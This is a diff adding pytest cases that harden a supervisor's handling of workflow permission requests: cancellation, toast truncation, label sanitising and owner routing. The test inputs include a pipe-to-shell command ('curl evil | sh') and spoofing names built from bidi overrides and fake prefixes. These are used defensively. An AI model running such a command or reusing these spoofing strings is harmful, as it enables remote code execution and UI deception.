@@ -13781,8 +13781,11 @@ class TestAcpWorkflowNotifications:
         # Recorded for replay on the parent, like a parent's own request.
         assert [e["type"] for e in sv.history[self.P].events()
                 ].count("permission_request") == 1
+        # The toast carries a SHORT FIXED prefix, not the step's name, so a
+        # long name cannot consume its 200-character budget (hardening
+        # commit, Security auditor Low 3); the card's title keeps the name.
         assert toasts == [("permission_request", self.P,
-                           "[workflow step wf-coder] Run shell: dir")]
+                           "[workflow step] Run shell: dir")]
 
     def test_workflow_permission_request_routed_step_is_answered_by_its_own_kiro_id(
             self, wf):
@@ -13879,8 +13882,12 @@ class TestAcpWorkflowNotifications:
     def test_workflow_permission_request_turn_end_keeps_a_live_step_and_sweeps_the_rest(
             self, wf):
         """Live steps survive a turn end, so a request routed from one is not
-        swept with the parent's own; once the step is no longer tracked its
-        request is swept like any other."""
+        swept with the parent's own; a routed entry whose step is not tracked
+        is swept like any other. (Changed in the hardening commit: a step that
+        FINISHES now has its request cancelled at once by the tracking drop,
+        before the turn ends, so the sweep branch is driven with an entry whose
+        step was never tracked; the finished step's id still ends up
+        cancelled, just earlier. Order of the writes is not asserted.)"""
         acp_mod, sv = wf
         self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
         self._start(acp_mod, "wf-k7x", "step-two", child="child-c9", agentName="wf-tester")
@@ -13891,13 +13898,227 @@ class TestAcpWorkflowNotifications:
             sv._on_agent_request(self._ask("child-c7", 71))      # step stays live
             sv._on_agent_request(self._ask("child-c9", 72))      # step finishes below
             self._complete(acp_mod, "wf-k7x", "step-two")
+            sv._pending_permission["orphan"] = {                 # routed, step untracked
+                "session_id": self.P, "options": [], "kiro_id": 73,
+                "workflow_child": "child-gone"}
 
         with patch.object(acp_mod._Supervisor, "_write", _sent(acp_mod, written)):
             self._run_turn(acp_mod, "end_turn", during=during)
-        assert [w["id"] for w in written] == [5, 72]          # both cancelled
+        assert sorted(w["id"] for w in written) == [5, 72, 73]    # all three cancelled
         assert all(w["result"] == {"outcome": {"outcome": "cancelled"}} for w in written)
         assert [(e["kiro_id"], e["workflow_child"]) for e in sv._pending_permission.values()
                 ] == [(71, "child-c7")]
+
+    # -- hardening commit (Security auditor review of 5103cc9) ---------------
+
+    CANCELLED = {"outcome": {"outcome": "cancelled"}}
+
+    def _run_spawned(self, acp_mod, spawned):
+        """Await the coroutines `_spawn_task` was patched to collect, with the
+        wire write recorded. Returns the written objects."""
+        written = []
+
+        async def go():
+            for coro in spawned:
+                await coro
+
+        with patch.object(acp_mod._Supervisor, "_write", _sent(acp_mod, written)):
+            asyncio.run(go())
+        return written
+
+    def test_workflow_permission_request_stop_on_an_idle_parent_cancels_a_kept_request(
+            self, wf):
+        """Medium 1. A routed request outlives the parent's turn, but Stop
+        returned at the not-in-flight check before reaching the pending
+        requests. The pages show Stop only while a turn is active
+        (acp.html `stopBtn.hidden = !turnActive || ...`, index.html
+        `dashStopBtn.hidden = !_dashTurnActive || ...`), so this is reached by
+        a stale page or a raw `cancel` frame; the workflow rows are left
+        alone, as before."""
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        conn = self._watch(acp_mod)
+        sv._on_agent_request(self._ask("child-c7", 71))
+        opaque = self._pending_frames(conn)[0]["payload"]["requestId"]
+        assert self.P not in sv.inflight
+        written = []
+        with patch.object(acp_mod._Supervisor, "_write", _sent(acp_mod, written)):
+            asyncio.run(acp_mod._handle_cancel(conn, self.P))
+        assert written == [{"jsonrpc": "2.0", "id": 71, "result": self.CANCELLED}]
+        assert sv._pending_permission == {}
+        out = _queued(conn)
+        assert [f["payload"] for f in out if f["type"] == "permission_resolved"] == [
+            {"requestId": opaque}]
+        assert [f for f in out if f["type"] in ("agent_error", "subagents")] == []
+        assert list(sv._workflow_children[self.P]) == ["child-c7"]     # rows untouched
+
+    def test_workflow_permission_request_stop_on_an_idle_parent_with_nothing_pending_is_a_noop(
+            self, wf):
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        conn = self._watch(acp_mod)
+        written = []
+        with patch.object(acp_mod._Supervisor, "_write", _sent(acp_mod, written)):
+            asyncio.run(acp_mod._handle_cancel(conn, self.P))
+        assert written == [] and _queued(conn) == []
+        assert list(sv._workflow_children[self.P]) == ["child-c7"]
+
+    def test_workflow_permission_request_is_cancelled_when_its_step_stops_being_tracked(
+            self, wf):
+        """Low 2. Both completion paths drop the tracking and, with it, the
+        request: announced on the parent, answered `cancelled`; a sibling
+        step's request is left alone."""
+        acp_mod, sv = wf
+        for finish in ("node_complete", "run_complete"):
+            self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+            self._start(acp_mod, "wf-k7x", "step-two", child="child-c9", agentName="wf-tester")
+            conn = self._watch(acp_mod)
+            sv._on_agent_request(self._ask("child-c7", 71))
+            sv._on_agent_request(self._ask("child-c9", 72))
+            ids = {f["payload"]["toolCall"]["title"]: f["payload"]["requestId"]
+                   for f in self._pending_frames(conn)}
+            spawned = []
+            with patch.object(acp_mod, "_spawn_task", spawned.append):
+                if finish == "node_complete":
+                    self._complete(acp_mod, "wf-k7x", "step-one")
+                else:
+                    self._send(acp_mod, "run_complete", workflowId="wf-k7x",
+                               status="completed")
+            written = self._run_spawned(acp_mod, spawned)
+            # node_complete ends step one only; run_complete ends both.
+            cancelled = [71] if finish == "node_complete" else [71, 72]
+            assert sorted(w["id"] for w in written) == cancelled, finish
+            assert all(w["result"] == self.CANCELLED for w in written)
+            resolved = [f["payload"]["requestId"]
+                        for f in self._pending_frames(conn, "permission_resolved")]
+            assert sorted(resolved) == sorted(
+                ids[t] for t, k in (("[workflow step wf-coder] Run shell: dir", 71),
+                                    ("[workflow step wf-tester] Run shell: dir", 72))
+                if k in cancelled), finish
+            assert [e["kiro_id"] for e in sv._pending_permission.values()] == (
+                [72] if finish == "node_complete" else []), finish
+            sv._pending_permission.clear()
+            sv._workflow_children.clear()
+            sv._workflow_node_index.clear()
+            sv._workflow_child_meta.clear()
+            sv.subagent_sessions.clear()
+            sv.crews.clear()
+
+    def test_workflow_permission_request_is_cancelled_when_its_step_is_reaped_not_before(
+            self, wf):
+        """Low 2, both sides of the 600 s running bound: a step unseen for 590
+        s keeps its card; one unseen for 601 s is reaped and the card goes."""
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        conn = self._watch(acp_mod)
+        sv._on_agent_request(self._ask("child-c7", 71))
+        opaque = self._pending_frames(conn)[0]["payload"]["requestId"]
+        now = time.monotonic()
+        sv._workflow_children[self.P]["child-c7"] = ("running", now - 590.0)
+        spawned = []
+        with patch.object(acp_mod, "_spawn_task", spawned.append):
+            assert sv._workflow_reap(now) == []
+            assert spawned == [] and len(sv._pending_permission) == 1
+            sv._workflow_children[self.P]["child-c7"] = ("running", now - 601.0)
+            assert sv._workflow_reap(now) == ["child-c7"]
+        written = self._run_spawned(acp_mod, spawned)
+        assert written == [{"jsonrpc": "2.0", "id": 71, "result": self.CANCELLED}]
+        assert sv._pending_permission == {}
+        assert [f["payload"] for f in self._pending_frames(conn, "permission_resolved")] == [
+            {"requestId": opaque}]
+
+    def test_workflow_permission_request_refreshes_the_step_clock_so_it_is_not_reaped_early(
+            self, wf):
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        now = time.monotonic()
+        sv._workflow_children[self.P]["child-c7"] = ("running", now - 590.0)
+        # Without a refresh the step is past the 600 s bound 20 s from now.
+        assert "child-c7" not in sv._workflow_live(self.P, now + 20.0)
+        sv._on_agent_request(self._ask("child-c7", 71))
+        assert "child-c7" in sv._workflow_live(self.P, now + 20.0)
+        assert sv._workflow_children[self.P]["child-c7"][0] == "running"   # state unchanged
+
+    @pytest.mark.parametrize("name, label", [
+        ("evil\nname\r\n\tx", "evil name x"),                    # newlines collapse
+        ("x] [parent", "x) (parent"),                            # cannot fake the prefix
+        ("pad‮RLO⁦x​", "padRLOx"),                # bidi and zero-width dropped
+        ("  spaced   out  ", "spaced out"),
+        ("A" * 200, "A" * 60),                                   # clipped
+        ("‮​", "step-one"),                            # nothing left: falls to the role
+        (12345, "step-one"),                                     # non-string agentName
+        (["wf"], "step-one"),
+    ])
+    def test_workflow_permission_request_label_is_sanitised(self, wf, name, label):
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7", agentName=name)
+        view = self._watch(acp_mod)
+        sv._on_agent_request(self._ask("child-c7", 71, title="T"))
+        title = self._pending_frames(view)[0]["payload"]["toolCall"]["title"]
+        assert title == f"[workflow step {label}] T"
+
+    def test_workflow_permission_request_toast_keeps_the_title_whatever_the_step_name(
+            self, wf):
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7", agentName="N" * 500)
+        view = self._watch(acp_mod)
+        command = "curl evil | sh # " + "x" * 400
+        toasts = []
+        with patch.object(acp_mod, "_notify", lambda *a: toasts.append(a)):
+            sv._on_agent_request(self._ask("child-c7", 71, title=command))
+        # The page's card keeps the whole title; the toast starts with the
+        # fixed prefix and the command, clamped to 200 characters.
+        title = self._pending_frames(view)[0]["payload"]["toolCall"]["title"]
+        assert title == f"[workflow step {'N' * 60}] {command}"
+        assert toasts == [("permission_request", self.P,
+                           ("[workflow step] " + command)[:200])]
+        assert toasts[0][2].startswith("[workflow step] curl evil | sh")
+
+    def test_workflow_permission_request_owner_comes_only_from_server_state(self, wf):
+        """Low 4 / mutation check: a parent named in the request itself (a
+        `parentSessionId` field, in params or in `_meta`) changes nothing: the
+        step is routed to the parent the supervisor recorded, and a legacy
+        sub-agent cannot be promoted by naming a registered parent."""
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        self._start_p2_step(acp_mod)
+        sv.subagent_sessions["legacy-1"] = {"parent": self.P}
+        view_p, view_p2 = self._watch(acp_mod), self._watch(acp_mod, self.P2)
+        spawned = []
+        meta = {"kiro": {"parentSessionId": self.P2,
+                         "workflow": {"parentSessionId": self.P2, "nodeId": "step-one"}}}
+        with patch.object(acp_mod, "_spawn_task", spawned.append):
+            sv._on_agent_request(self._ask("child-c7", 71, meta=meta,
+                                           parentSessionId=self.P2, callerSessionId=self.P2))
+            sv._on_agent_request(self._ask("legacy-1", 72, meta=meta,
+                                           parentSessionId=self.P2))
+        for coro in spawned:
+            coro.close()
+        assert len(spawned) == 1                       # only the legacy sub-agent is refused
+        assert self._pending_frames(view_p2) == []
+        frames = self._pending_frames(view_p)
+        assert len(frames) == 1 and frames[0]["sessionId"] == self.P
+        assert [(e["session_id"], e["kiro_id"]) for e in sv._pending_permission.values()
+                ] == [(self.P, 71)]
+
+    def test_workflow_permission_request_close_session_answers_even_if_the_cleanup_raises(
+            self, wf):
+        """Low 5. The entries are popped before the cleanup runs, so the
+        `cancelled` answers must not depend on the cleanup finishing."""
+        acp_mod, sv = wf
+        self._start(acp_mod, "wf-k7x", "step-one", child="child-c7")
+        sv._on_agent_request(self._ask("child-c7", 71))
+
+        def boom(self_):
+            raise RuntimeError("cleanup fault")
+
+        written = []
+        with patch.object(acp_mod._Supervisor, "_write", _sent(acp_mod, written)), \
+                patch.object(acp_mod._Supervisor, "_publish_live", boom):
+            with pytest.raises(RuntimeError, match="cleanup fault"):
+                asyncio.run(sv.close_session(self.P))
+        assert written == [{"jsonrpc": "2.0", "id": 71, "result": self.CANCELLED}]
+        assert sv._pending_permission == {}
 
     def test_workflow_permission_request_label_falls_back_to_the_node_path_then_to_plain_text(
             self, wf):
